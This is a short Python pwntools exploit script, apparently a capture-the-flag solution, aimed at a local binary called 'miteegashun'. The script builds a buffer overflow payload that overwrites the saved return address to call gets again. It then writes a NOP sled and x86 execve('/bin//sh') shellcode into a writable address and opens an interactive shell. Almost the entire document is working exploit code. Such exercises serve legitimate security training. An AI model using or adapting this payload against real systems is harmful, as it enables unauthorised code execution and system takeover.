from pwn import *

p = process("./miteegashun")



gets_addr = p32(0x08049b00)
write_target = 0x80ed000


shellcode =  "\x90"*80 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80"

buf = "A"*256 + "C"*8 + p32(write_target + 1) + p32(write_target) + p32(write_target + 1)*28 + "D"*29 + p32(write_target + 1) + gets_addr 

## overwrite saved ret addr to call gets again, write to writeable address i found.
p.sendline(buf)

# write a large nop sled + shellcode
p.sendline(shellcode)
p.interactive()
